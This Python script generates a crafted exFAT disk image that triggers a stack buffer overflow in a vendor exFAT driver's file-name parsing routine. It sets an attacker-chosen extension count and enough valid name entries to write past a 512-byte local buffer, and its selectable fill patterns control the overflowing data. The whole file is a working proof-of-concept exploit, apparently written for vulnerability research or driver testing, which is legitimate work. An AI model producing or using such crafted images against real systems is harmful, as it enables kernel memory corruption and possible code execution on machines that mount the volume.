#!/usr/bin/env python3
"""Craft an exFAT volume whose root directory holds one file entry set with an
attacker-chosen num_ext and that many valid 0xC1 name dentries.

Target defect (vendor source, exfat.c:3622 exfat_get_uni_name_from_ext_entry):

    num_ext_entries = file_ep->num_ext;          /* raw on-disk u8 */
    ...
    for (i = 1; i < num_ext_entries; i++, ep++) {
        if (get_entry_type(ep) == TYPE_EXTEND) {
            extract_uni_name_from_name_entry(ep, uniname, i);   /* <=15 u16 */
            order++;
        } else { ...; goto out; }
        uniname += 15;                            /* NO BOUND */
    }

`uniname` is UNI_NAME_T.name, a UINT16[256] (512 bytes) local in the caller.
17 iterations fill it exactly; iteration 18 onward writes past it.

Usage:
    mkcase.py OUT.img NUM_EXT [--fill PATTERN] [--entries N]

  NUM_EXT   value written to FILE_DENTRY_T.num_ext (0..255)
  --entries how many real 0xC1 name dentries to lay down. Defaults to
            NUM_EXT-1 (the maximum the loop will consume). Set lower to prove
            the loop bails on a non-EXTEND entry.
  --fill    'ascii'  : cycling A-Z, printable, no NULs (default)
            'marker' : u16 counter, so each 2-byte slot is identifiable
            'const:0xXXXX' : a fixed u16 value
"""
import struct
import sys

SECTOR_SHIFT = 9
SECTOR = 1 << SECTOR_SHIFT
SPC_SHIFT = 3                      # sectors per cluster
CLUSTER = SECTOR << SPC_SHIFT      # 4096
VOL_SECTORS = 131072               # 64 MiB
FAT_OFF = 2048
FAT_LEN = 126
HEAP_OFF = 4096
CLUSTER_COUNT = 15872
ROOT_CLU = 5
ALLOC_BITMAP_CLU = 2
UPCASE_CLU = 3


def checksum_2byte(data, chksum=0, dir_entry=False):
    """calc_checksum_2byte() from exfat.c:3704. CS_DIR_ENTRY skips bytes 2,3."""
    for i, c in enumerate(data):
        if dir_entry and i in (2, 3):
            continue
        chksum = (((chksum & 1) << 15) | ((chksum & 0xFFFE) >> 1)) + c
        chksum &= 0xFFFF
    return chksum


def upcase_checksum(table):
    """calc_checksum_4byte(), CS_DEFAULT."""
    c = 0
    for b in table:
        c = (((c & 1) << 31) | ((c & 0xFFFFFFFE) >> 1)) + b
        c &= 0xFFFFFFFF
    return c


def build_boot_sector():
    bs = bytearray(SECTOR)
    bs[0:3] = b"\xeb\x76\x90"
    bs[3:11] = b"EXFAT   "
    struct.pack_into("<Q", bs, 64, 0)                  # PartitionOffset
    struct.pack_into("<Q", bs, 72, VOL_SECTORS)        # VolumeLength
    struct.pack_into("<I", bs, 80, FAT_OFF)
    struct.pack_into("<I", bs, 84, FAT_LEN)
    struct.pack_into("<I", bs, 88, HEAP_OFF)
    struct.pack_into("<I", bs, 92, CLUSTER_COUNT)
    struct.pack_into("<I", bs, 96, ROOT_CLU)
    struct.pack_into("<I", bs, 100, 0x12345678)        # VolumeSerialNumber
    struct.pack_into("<H", bs, 104, 0x0100)            # FileSystemRevision
    struct.pack_into("<H", bs, 106, 0)                 # VolumeFlags
    bs[108] = SECTOR_SHIFT
    bs[109] = SPC_SHIFT
    bs[110] = 1                                        # NumberOfFats
    bs[111] = 0x80                                     # DriveSelect
    bs[112] = 0                                        # PercentInUse
    bs[510:512] = b"\x55\xaa"
    return bytes(bs)


def build_image(num_ext, n_entries, fill):
    img = bytearray(VOL_SECTORS * SECTOR)

    boot = build_boot_sector()
    img[0:SECTOR] = boot
    # Main boot region: sector 0 boot, 1..8 extended (zero + sig), 9 OEM,
    # 10 reserved, 11 checksum. exfat_mount() in this driver does not verify
    # the boot checksum, but keep the layout plausible.
    for s in range(1, 9):
        img[s * SECTOR + 510: s * SECTOR + 512] = b"\x55\xaa"
    img[9 * SECTOR + 510: 9 * SECTOR + 512] = b"\x55\xaa"

    # Boot checksum sector (11): repeated u32 over sectors 0..10 skipping 106,107,112
    csum = 0
    for i in range(11 * SECTOR):
        if i in (106, 107, 112):
            continue
        csum = (((csum & 1) << 31) | ((csum & 0xFFFFFFFE) >> 1)) + img[i]
        csum &= 0xFFFFFFFF
    for i in range(SECTOR // 4):
        struct.pack_into("<I", img, 11 * SECTOR + i * 4, csum)
    # Backup boot region at sector 12..23
    img[12 * SECTOR: 24 * SECTOR] = img[0: 12 * SECTOR]

    def clu_off(c):
        return (HEAP_OFF + (c - 2) * (1 << SPC_SHIFT)) * SECTOR

    # ---- FAT: bitmap(2), upcase(3), root(5) each single-cluster EOF -------
    fat = bytearray(FAT_LEN * SECTOR)
    struct.pack_into("<I", fat, 0, 0xFFFFFFF8)
    struct.pack_into("<I", fat, 4, 0xFFFFFFFF)
    for c in (ALLOC_BITMAP_CLU, UPCASE_CLU, ROOT_CLU):
        struct.pack_into("<I", fat, c * 4, 0xFFFFFFFF)
    struct.pack_into("<I", fat, 4 * 4, 0xFFFFFFFF)     # cluster 4 unused-but-EOF
    img[FAT_OFF * SECTOR: FAT_OFF * SECTOR + len(fat)] = fat

    # ---- allocation bitmap: clusters 2,3,4,5 in use ----------------------
    nbytes = (CLUSTER_COUNT + 7) // 8
    bm = bytearray(nbytes)
    for c in (2, 3, 4, 5):
        bit = c - 2
        bm[bit // 8] |= 1 << (bit % 8)
    img[clu_off(ALLOC_BITMAP_CLU): clu_off(ALLOC_BITMAP_CLU) + len(bm)] = bm

    # ---- up-case table: identity, compressed ------------------------------
    up = bytearray()
    for i in range(128):
        up += struct.pack("<H", i)
    up += struct.pack("<H", 0xFFFF) + struct.pack("<H", 128)   # skip 128 entries
    img[clu_off(UPCASE_CLU): clu_off(UPCASE_CLU) + len(up)] = up
    up_sum = upcase_checksum(up)

    # ---- root directory ---------------------------------------------------
    root = bytearray()

    # 0x83 volume label
    vl = bytearray(32)
    vl[0] = 0x83
    label = "LAB"
    vl[1] = len(label)
    for i, ch in enumerate(label):
        struct.pack_into("<H", vl, 2 + i * 2, ord(ch))
    root += vl

    # 0x81 allocation bitmap
    ab = bytearray(32)
    ab[0] = 0x81
    ab[1] = 0
    struct.pack_into("<I", ab, 20, ALLOC_BITMAP_CLU)
    struct.pack_into("<Q", ab, 24, nbytes)
    root += ab

    # 0x82 up-case table
    uc = bytearray(32)
    uc[0] = 0x82
    struct.pack_into("<I", uc, 4, up_sum)
    struct.pack_into("<I", uc, 20, UPCASE_CLU)
    struct.pack_into("<Q", uc, 24, len(up))
    root += uc

    # ---- the malicious entry set -----------------------------------------
    # 0x85 file dentry, attacker-chosen num_ext
    fe = bytearray(32)
    fe[0] = 0x85
    fe[1] = num_ext & 0xFF
    struct.pack_into("<H", fe, 4, 0x0020)              # attr = ARCHIVE (a FILE)
    struct.pack_into("<H", fe, 8, 0x0000)              # create time
    struct.pack_into("<H", fe, 10, 0x2100)             # create date
    struct.pack_into("<H", fe, 12, 0x0000)
    struct.pack_into("<H", fe, 14, 0x2100)
    struct.pack_into("<H", fe, 16, 0x0000)
    struct.pack_into("<H", fe, 18, 0x2100)

    # 0xC0 stream extension. name_len drives nls_uniname_to_cstring's read of
    # the (already-overflowed) buffer, so keep it legal-looking.
    se = bytearray(32)
    se[0] = 0xC0
    se[1] = 0x01                                       # flags: alloc possible
    name_len = min(255, max(1, (n_entries * 15)))
    se[3] = name_len & 0xFF
    struct.pack_into("<H", se, 4, 0x0000)              # name_hash (unverified here)
    struct.pack_into("<Q", se, 8, 0)                   # valid_size
    struct.pack_into("<I", se, 20, 0)                  # start_clu
    struct.pack_into("<Q", se, 24, 0)                  # size

    # 0xC1 name dentries
    names = bytearray()
    for k in range(n_entries):
        ne = bytearray(32)
        ne[0] = 0xC1
        ne[1] = 0
        for j in range(15):
            if fill == "ascii":
                v = 0x41 + ((k * 15 + j) % 26)
            elif fill == "marker":
                v = (k * 15 + j) & 0xFFFF
                if v == 0:
                    v = 0x2401
            elif fill.startswith("const:"):
                v = int(fill.split(":", 1)[1], 0)
            else:
                raise SystemExit("bad --fill")
            struct.pack_into("<H", ne, 2 + j * 2, v)
        names += ne

    # SetChecksum over the whole entry set (file + stream + names).
    entry_set = bytes(fe) + bytes(se) + bytes(names)
    cs = checksum_2byte(entry_set[:32], 0, dir_entry=True)
    for off in range(32, len(entry_set), 32):
        cs = checksum_2byte(entry_set[off:off + 32], cs, dir_entry=False)
    struct.pack_into("<H", fe, 2, cs)

    root += bytes(fe) + bytes(se) + bytes(names)

    if len(root) > CLUSTER:
        # root dir is one cluster here; 4096/32 = 128 entries max
        raise SystemExit(f"entry set too large for one cluster: {len(root)} bytes")

    img[clu_off(ROOT_CLU): clu_off(ROOT_CLU) + len(root)] = root
    return bytes(img)


def main():
    if len(sys.argv) < 3:
        raise SystemExit(__doc__)
    out = sys.argv[1]
    num_ext = int(sys.argv[2], 0)
    fill = "ascii"
    n_entries = None
    args = sys.argv[3:]
    while args:
        a = args.pop(0)
        if a == "--fill":
            fill = args.pop(0)
        elif a == "--entries":
            n_entries = int(args.pop(0), 0)
        else:
            raise SystemExit(f"unknown arg {a}")
    if n_entries is None:
        n_entries = max(0, num_ext - 1)

    data = build_image(num_ext, n_entries, fill)
    with open(out, "wb") as fh:
        fh.write(data)
    written = 15 * n_entries
    print(f"{out}: num_ext={num_ext} name_dentries={n_entries} fill={fill}")
    print(f"  loop will consume min(num_ext-1, {n_entries}) = "
          f"{min(num_ext - 1, n_entries)} entries")
    print(f"  uniname advance = 15 u16 per iteration; buffer = 256 u16 (512 B)")
    print(f"  max u16 written  = {min(num_ext - 1, n_entries) * 15} "
          f"({'OVERFLOW' if min(num_ext - 1, n_entries) * 15 > 256 else 'in bounds'})")


if __name__ == "__main__":
    main()
